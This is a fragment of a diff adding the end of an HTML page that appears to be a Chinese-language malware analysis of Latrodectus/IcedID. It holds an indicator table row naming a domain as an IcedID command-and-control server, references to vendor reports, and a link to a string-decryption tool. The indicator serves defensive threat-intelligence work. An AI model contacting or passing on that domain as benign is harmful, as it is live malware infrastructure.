+<td>neaachar.com</td>
+<td>domain</td>
+<td></td>
+<td>ICEDID C2</td>
+</tr>
+</tbody>
+</table>
+<h1 data-content="1" id="55af9ccc7575092bd4e4a6e3a296bf2e">参考资料</h1>
+<p>以上研究中参考了以下内容：<br/>
+https:// medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39<br/>
+https:// www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice    <a href="https://xz.aliyun.com/t/14268" target="_blank">先知上之前已翻译</a></p>
+<h1 data-content="1" id="0d220238e007495bccf6d270db7e9789">工具</h1>
+<p><a href="https://github.com/elastic/labs-releases/blob/main/tools/latrodectus/latro_str_decrypt.py" target="_blank">字符串解密和 IDA 注释工具</a></p>
+</div>
+</div>
